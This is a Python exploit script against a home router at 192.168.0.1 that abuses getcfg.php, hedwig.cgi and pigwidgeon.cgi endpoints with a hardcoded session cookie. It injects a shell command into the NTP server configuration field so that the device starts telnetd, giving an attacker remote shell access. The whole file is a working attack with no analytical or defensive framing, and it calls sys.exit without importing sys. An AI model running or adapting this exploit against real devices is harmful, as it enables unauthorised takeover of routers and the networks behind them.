# -*- coding:utf-8 -*-

import requests, os
from lxml import etree
from traceback import print_exc
try:
    from urllib.parse import urljoin
except:
    from urlparse import urljoin
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re

url = 'http://192.168.0.1/'
print("Exploit continuing...")
COMMAND = 'telnetd'
uid = 'b8gh3GJptw'         ###update it!!!!!
session = requests.Session()
session.verify = False
session.cookies.update({"uid": uid})
################get DEVICE.TIME###############################
try:
    res = session.post(urljoin(url,'/getcfg.php'),data={"SERVICES":"DEVICE.TIME","AUTHORIZED_GROUP":"1\n"})
    # print(res.content)
    tree = etree.fromstring(res.content)
    tree.xpath("//ntp/enable")[0].text = "1"
    tree.xpath("//ntp/server")[0].text = "metelesku; (" + COMMAND + ") & exit; "
    tree.xpath("//ntp6/enable")[0].text = "1"
    data = etree.tostring(tree)
    # print(data)
except:
    print_exc()
    pass
# exit()
#################POST hedwig.cgi###############################
print("hedwig")
headers = {"Content-Type": "text/xml"}
data = etree.tostring(tree)
resp = session.post(urljoin(url, "/hedwig.cgi"), headers=headers, data=data)
# print(resp.text)
tree = etree.fromstring(resp.content)
result = tree.findtext("result")
if result.lower() != "ok":
    print("Failed!")
    print(resp.text)
    sys.exit()
print("OK")
###############POST pigwidgeon.cgi##############################
print("pigwidgeon")
data = {"ACTIONS": "SETCFG,ACTIVATE"}
resp = session.post(urljoin(url, "/pigwidgeon.cgi"), data=data)
# print(resp.text)
tree = etree.fromstring(resp.content)
result = tree.findtext("result")
if result.lower() != "ok":
    print("Failed!")
    print(resp.text)
    exit()
print("OK")
